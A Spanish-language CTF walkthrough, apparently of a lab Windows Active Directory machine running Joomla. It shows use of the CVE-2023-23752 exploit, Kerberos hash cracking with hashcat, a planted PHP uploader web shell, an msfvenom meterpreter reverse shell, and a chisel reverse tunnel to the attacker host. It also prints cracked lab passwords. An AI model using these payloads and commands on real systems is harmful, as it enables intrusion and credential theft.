#ActiveDirectory #windows #fuzzing 
### Ping
```python
ping -c 1 10.10.11.3
PING 10.10.11.3 (10.10.11.3) 56(84) bytes of data.
64 bytes from 10.10.11.3: icmp_seq=1 ttl=127 time=153 ms

--- 10.10.11.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 153.009/153.009/153.009/0.000 ms
```

### TTL 127 = Windows

### nmap
```python
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-04 10:01:53Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: 403 Forbidden
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
51349/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51352/tcp open  msrpc         Microsoft Windows RPC
61261/tcp open  msrpc         Microsoft Windows RPC
61265/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-04T10:02:51
|_  start_date: N/A
|_clock-skew: 7h58m55s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 142.64 seconds
```

### Dominio
tenemos el nombre del dominio y el DNS así que lo agregaremos al host
![[Pasted image 20240403221531.png]]

### Enumeración del puerto 53 (Domain)
podemos ver una cookie que podríamos guardar
![[Pasted image 20240403222134.png]]

`dnsenum`
probamos con dnsenum pero tampoco podemos enumerar nada
![[Pasted image 20240403223945.png]]

### Enumeración del puerto 80 (http)

![[Pasted image 20240403222016.png]]

### Fuzzing con ffuz
obtenemos un montón de directorios. administrator parece interesante
![[Pasted image 20240403231931.png]]

`administrator`
obtenemos el panel de login pero no tenemos credenciales validas 
![[Pasted image 20240403232007.png]]

`manifests`
![[Pasted image 20240403234159.png]]

`manifests`
encontramos un subdirectorio dentro de administrator llamado manifests. vamos a enumerar
![[Pasted image 20240403234220.png]]

`http://office.htb/administrator/manifests/files/joomla.xml`
enumerando los archivos llegamos a esta ruta donde conseguimos un archivo joomla.xml que nos muestra la versión del CMS
![[Pasted image 20240403234348.png]]

### Vulnerabilidad CVE-2023-23752 joomla
Es un bypass de autenticación que resulta en una fuga de información en los servidores Joomla!.
![[Pasted image 20240403235334.png]]

`descarga del repositorio`
```python
$ git clone https://github.com/Pari-Malam/CVE-2023-23752
$ cd CVE-2023-23752
$ pip/pip3 install -r requirements.txt
$ python/python3 joomla.py
```

`pip install`
![[Pasted image 20240403235224.png]]

### joomla.py
este exploit aprovecha una vulnerabilidad en joomlab lo cual permite leer la base de datos y obtener las credenciales del usuario root
![[Pasted image 20240403235809.png]]

`credenciales`
las credenciales que hemos conseguido no son validas para ingresar al CMS
![[Pasted image 20240404000232.png]]

### kerbrute
vamos a enumerar usuarios utilizando `kerbrute` de esta manera obtenemos una lista de usuario que podemos validar
![[Pasted image 20240404110458.png]]

### crackmapexec
validamos todos los usuarios con la contraseña que hemos conseguido anterior mente y encontramos que uno de los usuarios tiene permisos para leer los recursos compartidos
```python
crackmapexec smb 10.10.11.3 -u usuario.txt -p 'H0lOgrams4reTakIng0Ver754!' --shares
```
![[Pasted image 20240404112750.png]]

### smbmap
obtenemos lectura para un recurso compartido llamado SOC Analysis
![[Pasted image 20240404113839.png]]

`--download`
descargamos el recurso compartido
![[Pasted image 20240404114218.png]]

### Wireshack
abrimos el archivo .pcap que hemos obtenido y vamos buscar alguna conexión donde podamos extraer información \
![[Pasted image 20240404114623.png]]

### cipher
vamos a filtrar por kerberos y analizamos cada una de las conexiones en este caso podemos ver el cipher de una de las conexiones y tambien en etype (18) este es el tipo de has que wireshark nos indica y finalmente el nombre `tstark`
![[Pasted image 20240404121922.png]]

### datos
haciendo una recopilación de datos podemos obtener los parámetros suficientes para armar nuestro hash de kerberos 
![[Pasted image 20240404122307.png]]

### ejemplos de hash
el ejemplo 19900 pertenece a `autenticacion de kerberos 18` la misma que nos indica el wireshark asi usaremos este enemplo para crear nuestro hash con los datos que hemos obtenidos
![[Pasted image 20240404122442.png]]

`hast`
reemplazando todos los parámetros del ejemplo por los que hemos obtenido creamos el hash completo para luego decodearlo
![[Pasted image 20240404123125.png]]

### hashcat 
iniciamos `hashcat` 
![[Pasted image 20240404123310.png]]

`recuerda probar diferentes diccionarios`
```python
hashcat -m 19900 hash /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20240404124233.png]]

### joomla
tenemos al joomla
![[Pasted image 20240404130117.png]]

`administrator/template`
`subimos un archivo que contenga un uploader para poder verlo desde la web`
```python
<?php
echo "<title>RevSlideR 2015</title><br><br>";
$win = strtolower(substr(PHP_OS,0,3)) == "win";
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "4,1ON(BuSuX)";
}
else {$safemode = false; $hsafemode = "OFF(WoKeH)";}
$os = wordwrap(php_uname(),90,"<br>",1);
$xos = "Safe-mode:[Safe-mode:".$hsafemode."] 7 [OS:".$os."]";
echo "<center> ".$xos." </center><br>";

if(isset($_GET['x'])){
echo "<title>PiNDaH 2015</title><br><br>";
$source = $_SERVER['SCRIPT_FILENAME'];
$desti =$_SERVER['DOCUMENT_ROOT']."/default.php";
copy($source, $desti);
}

echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload SUKSES !!!</b><br><br>'; }
    else { echo '<b>Upload GAGAL !!!</b><br><br>'; }
}
?>
```
![[Pasted image 20240404132235.png]]

`uploader`
con este código podemos crear un php donde se pueden subir archivos 
![[Pasted image 20240404142806.png]]

`git clone`
vamos a bajarnos este repositorio el cual contiene una shell interactiva que podemos verla desde la web https://github.com/flozz/p0wny-shell
![[Pasted image 20240404133138.png]]

`subimos la shell de p0wny`
![[Pasted image 20240404133431.png]]

`cambiamos la ruta de error.php por la de shell.php`
de esta manera invocamos la shell interactiva que acabamos de subir y desde aquí tenemos ejecución de comandos
![[Pasted image 20240404143029.png]]

### msfvenom
vamos a crear un payload para windows que nos permita obtener una meterpreter reverse shell
```python
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP(tun0) LPORT=7890 -f exe > revershell.exe
```
![[Pasted image 20240404143935.png]]

`curl IP`
aqui hacemos un curl a la ip para subir la shell que acabamos de crear
![[Pasted image 20240404143654.png]]

`ejecutamos la shell`
![[Pasted image 20240404144229.png]]

### meterpreter 
estaremos a la escucha en el meterpreter utilizando multi/handler y con los parametros
![[Pasted image 20240404144206.png]]

`migrate`
vamos a crear un nuevo proceso con una cmd y migramos hacia ese proceso
![[Pasted image 20240404144501.png]]

### Runas
vamos a utilizar runas para poder invocar una nueva shell con las credenciales de otro usuario [Runas](![[Pasted image 20240404145459.png]]) creamos un servidor con `python3` y lo subimos a la maquina victima 
![[Pasted image 20240404145243.png]]

### meterpreter
```python
meterpreter > run post/windows/manage/run_as_psh USER=tstark PASS=playboy69 EXE=cmd.exe
```
con las credenciales podemos hacer el cambio para una cmd del usuario en cuestion
![[Pasted image 20240404163052.png]]

### netstat
con este comando podemos ver los puertos que están a la escucha y filtrar los puerto por TCP 
```python
netstat -an | findstr /C:"TCP"
```
![[Pasted image 20240404164542.png]]

### Port-forwarding 
vamos a levantar un servidor con chisel por el puerto 1133
![[Pasted image 20240404173728.png]]

`maquina victima`
![[Pasted image 20240404173840.png]]

`ejecutamos chisel para windows`
```python
.\chisel_windows.exe client 10.10.14.207:1133 R:8083:127.0.0.1:8083

# Este comando establece un túnel con Chisel desde la máquina cliente (maquina Windows victima) hacia el servidor Chisel (Maquina atacante linux) en la dirección IP `10.10.14.207` y el puerto `1133`. y configura una redirección para el puerto `8083`, redirigiendo el tráfico del cliente chisel al puerto `8083` del servidor chisel. 
```
![[Pasted image 20240404180732.png]]

`maquina atacante`
obtenemos una session#1 por lo cual estamos haciendo un `Port-forwarding` enviando el puerto 8083 de la maquina victima hacia el puerto 8083 de la maquina atacante 
![[Pasted image 20240404181342.png]]

### Enumeración del puerto 8083 de la maquina victima (Port-forwarding)
obtenemos acceso a una pagina web diferente que esta corriendo en local. 
![[Pasted image 20240404181644.png]]